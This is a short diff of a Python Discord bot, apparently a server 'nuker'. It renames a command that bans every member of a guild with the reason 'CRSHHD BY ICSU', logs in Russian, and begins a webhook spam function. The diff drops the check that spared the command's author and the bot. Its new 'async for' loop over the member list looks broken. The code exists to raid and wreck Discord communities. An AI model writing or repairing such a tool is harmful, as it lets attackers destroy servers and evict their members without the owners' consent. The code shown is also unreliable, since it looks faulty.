@@ -82,18 +82,16 @@ async def on_ready():
 
 
 @bot.command()
-async def banall(ctx):
+async def allban(ctx):
     await ctx.message.delete()
-    print(Fore.YELLOW + "[~] Выполняется !ban-all")
+    log('~', "Выполняется бан участников...")
 
-    for member in ctx.guild.members:
-        if member == ctx.author or member == bot.user:
-            continue
+    async for member in ctx.guild.members:
         try:
             await member.ban(reason="CRSHHD BY ICSU")
-            print(Fore.GREEN + f"[+] Забанен: {member}")
+            log('+', f"Забанен: {member}")
         except:
-            print(Fore.RED + "[-] Не удалось забанить: {member}")
+            log('-', f"Не удалось забанить: {member}")
 
 async def spm_hook(webhook):
     for i in range(30):
